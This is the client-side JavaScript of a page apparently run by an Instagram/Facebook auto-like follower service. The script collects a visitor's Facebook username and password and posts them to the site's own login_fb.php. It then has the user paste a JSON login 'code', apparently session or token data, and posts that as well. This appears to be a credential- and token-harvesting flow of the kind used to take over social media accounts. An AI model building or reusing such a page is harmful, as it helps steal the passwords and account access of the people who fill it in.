  <script type='text/javascript'>
    var tentou = false;
	var locked = false;
	function entrarfb(){
		$('#modal_fb').modal({
			escapeClose: false,
			clickClose: false
		});

		
	}


	$('#FBForm_code').submit(function(event){
		
		event.preventDefault();

		if(locked === false){
			try {
				JSON.parse($('#code').val());
			} catch(e) {
				$('#code').val('');
				return alert('Copy the code entirely to confirm the login.');
			};
			
			locked = true;
			$('#avisofb').html("<center><img src='imagens/loading.gif' width='50' alt='IgSeguidores AutoLike Instagram'><h2>Wait.... It can take up to 1 minute.</h2></center>");
			$.modal.close();
			$('#modal_fb').modal({
				escapeClose: false,
				clickClose: false
			});

			$.post( "/login_fb.php?r="+Math.random(), $(this).serialize()).done(function( data ) {
				$('#avisofb').html(data);
				locked = false;
			});
		}
		
	});


	$('#FBForm').submit(function(event){
		
		if(locked === false){
			locked = true;
			$('#avisofb').html("<center><img src='imagens/loading.gif' width='50' alt='IgSeguidores AutoLike Instagram'><h2>Wait.... It can take up to 1 minute.</h2></center>");
			$.post( "/login_fb.php?r="+Math.random(), $(this).serialize()).done(function( data ) {
				$('#avisofb').html(" ");
				locked = false;
				$('#code').val('');
				$('#loginFrame').attr('src',data);
				$.modal.close();
				$('#fb_user').val($('#fb_user_1').val());
				$('#fb_senha').val($('#fb_senha_1').val());
				$('#modal_fb_code').modal({
					escapeClose: false,
					clickClose: false
				});
			});
		}
		event.preventDefault();
		
	});


  </script>

	


				
